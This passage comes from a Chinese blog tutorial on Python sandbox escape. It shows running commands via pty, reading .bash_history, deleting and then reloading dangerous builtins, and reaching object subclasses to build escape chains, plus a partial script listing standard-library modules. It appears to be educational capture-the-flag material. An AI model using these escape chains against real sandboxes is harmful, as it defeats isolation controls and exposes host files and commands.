class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line">open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="重新导入"><a href="#重新导入" class="headerlink" title="重新导入"></a>重新导入</h2><p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p><p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这时可以尝试重新导入<code>内建模块</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure><p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p><h2 id="构造逃逸链"><a href="#构造逃逸链" class="headerlink" title="构造逃逸链"></a>构造逃逸链</h2><p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p><p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code>两个方法，除非显式声明继承自<code>object</code>类。</p><p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p><p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p><p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p><p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p><h3 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h3><p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">object</span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure><h3 id="遍历派生类"><a href="#遍历派生类" class="headerlink" title="遍历派生类"></a>遍历派生类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 